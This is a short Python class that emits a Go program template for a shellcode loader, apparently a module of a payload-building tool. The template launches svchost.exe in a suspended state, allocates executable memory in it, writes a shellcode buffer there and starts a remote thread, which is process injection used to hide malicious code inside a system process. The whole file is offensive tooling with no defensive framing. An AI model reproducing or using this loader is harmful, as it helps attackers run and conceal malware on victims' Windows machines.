class spawnandinject:

    def imports(self) -> list[str]:
        return ['"golang.org/x/sys/windows"',
                '"syscall"']

    def compilerOptions(self) -> list[str]:
        return ["golang.org/x/sys/windows"]

    def template(self) -> str:
        return """
package main

import (
{imports}
)

{codeblocks}

func main() {{

    
    {transformers}

	// Load DLLs and Procedures
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")

    VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
    CreateRemoteThread := kernel32.NewProc("CreateRemoteThread")
    WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
    CloseHandle := kernel32.NewProc("CloseHandle")

	procInfo := &windows.ProcessInformation{{}}
	startupInfo := &windows.StartupInfo{{
		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
		ShowWindow: 1,
	}}
	windows.CreateProcess(nil, syscall.StringToUTF16Ptr("C:\\\\windows\\\\system32\\\\svchost.exe"), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
    
	addr, _, _ := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE), uintptr(windows.PAGE_EXECUTE_READ))
    
    _ = windows.WriteProcessMemory(procInfo.Process, addr, &shellcode[0], uintptr(len(shellcode)), nil)
    
    thread, _, _ := CreateRemoteThread.Call(uintptr(procInfo.Process), 0, uintptr(0), addr, uintptr(0), 0, uintptr(0))
    
	WaitForSingleObject.Call(thread, 500)
	
    CloseHandle.Call(thread);
}}
"""